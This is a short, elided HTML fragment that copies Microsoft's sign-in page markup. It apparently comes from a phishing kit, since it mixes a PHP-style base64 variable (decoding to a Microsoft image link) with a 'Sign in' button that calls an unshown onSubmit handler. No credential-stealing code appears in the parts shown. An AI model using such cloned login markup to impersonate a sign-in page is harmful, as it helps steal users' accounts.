...
<html dir=ltr lang=EN-US>
  ...
  $encoded = "PGxpbmsgcmVsPWltYWdlX3NyYyBocmVmPWh0dHBzOi8vbG9naW5jZG4ubXNmdGF1dGgubmV0LzE2LjAwMC4yOTcxNy4xL2ltYWdlcy9XaW5kb3dzX0xpdmVfdl90aHVtYi5qcGc+";
  ...
  <body class=cb data-bind="defineGlobals: ServerData, bodyCssClass">
    ...
    externalCss: { 'button-field-container': true }">
                                            <div data-bind="css: { 'inline-block': isPrimaryButtonVisible }, externalCss: { 'button-item': true }" class="inline-block button-item ext-button-item">
                                              <input type=button id=idSIButton9 class="win-button button_primary button ext-button primary ext-primary" data-bind="
                ...
                preventTabbing: primaryButtonPreventTabbing" value="Sign in" data-report-attached=1 onclick="onSubmit()">
                                            </div>
                                          </div>
                                        </div>
                                      </div>
